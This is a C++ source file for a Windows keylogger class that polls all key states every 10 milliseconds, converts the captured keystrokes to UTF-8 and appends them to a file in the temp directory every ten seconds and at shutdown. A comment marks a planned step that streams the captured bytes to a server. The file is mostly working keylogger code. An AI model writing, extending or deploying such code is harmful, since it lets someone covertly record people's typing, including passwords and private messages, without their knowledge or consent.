#include "pch.h"
#include "keylogger.h"

c_keylogger::c_keylogger( ) {
    m_active = true;
    m_input = new c_inputsystem( );
    m_gathered_input.clear( );

    // create the debugging file
//#ifdef LOG_TO_FILE
//    CHAR path[ MAX_PATH ];
//    GetTempPathA( MAX_PATH, path );
//    strcat_s( path, MAX_PATH, FILE_NAME );
//
//    FILE* file;
//    fopen_s( &file, path, "wb" );
//    fclose( file );
//#endif
}

c_keylogger::~c_keylogger( ) {
    if ( m_input )
        delete m_input;
}

void c_keylogger::start_loop( ) {
    auto prev_time = std::chrono::high_resolution_clock::now( );

    while ( m_active ) {
        m_input->get_keystates( );

        for ( int i = 0; i < 0xFF; i++ ) {
            if ( m_input->get_state( i, PRESSED ) ) {
                auto str = m_input->get_character( i );
                if ( str.length( ) )
                    m_gathered_input.push_back( str );
            }
        }

        // log to file/upload log once every second minute
        auto cur_time = std::chrono::high_resolution_clock::now( );
        if ( std::chrono::duration_cast< std::chrono::seconds >( cur_time - prev_time ).count( ) > 10 ) {
            stream_bytes( );
            prev_time = cur_time;
        }

        std::this_thread::sleep_for( std::chrono::milliseconds( 10 ) );
    }

    // when shutting down do a file write
    stream_bytes( );
}

void c_keylogger::write_log( std::vector<uint8_t> utf8_bytes ) {
#ifdef LOG_TO_FILE
    CHAR path[ MAX_PATH ];
    GetTempPathA( MAX_PATH, path );
    strcat_s( path, MAX_PATH, FILE_NAME );

    FILE* file;
    fopen_s( &file, path, "a" ); // open the file with "APPEND"
    fwrite( &utf8_bytes[ 0 ], sizeof( uint8_t ), utf8_bytes.size( ), file );
    fclose( file );
#endif
}

void c_keylogger::stream_bytes( ) {
    // make sure they actually pressed any keys
    if ( m_gathered_input.empty( ) )
        return;

    std::vector<uint8_t> utf8_bytes;

    // just make a stack-allocation for this and we'll use the same temporary buffer for all of the inputs
    char output[ 128 ];
    for ( auto it : m_gathered_input ) {
        // zero out the output to not keep any invalid information
        memset( output, 0, 128 );

        // convert WCHAR to MultiByte UTF-8 format
        int written = WideCharToMultiByte( CP_UTF8, 0, it.c_str( ), -1, output, 128, nullptr, nullptr );

        // if it couldnt write anything, or if it only wrote null termination dont do anything further
        if ( written && --written ) {
            // get each byte written (except for null-termination) into the vector of bytes
            for ( int i = 0; i < written; i++ )
                utf8_bytes.push_back( output[ i ] );
        }
    }

    // queue the async stream of bytes to server here

    // write to the debug keylog output file.
    write_log( utf8_bytes );

    // clear the gathered input to prepare for the next "session"
    m_gathered_input.clear( );
}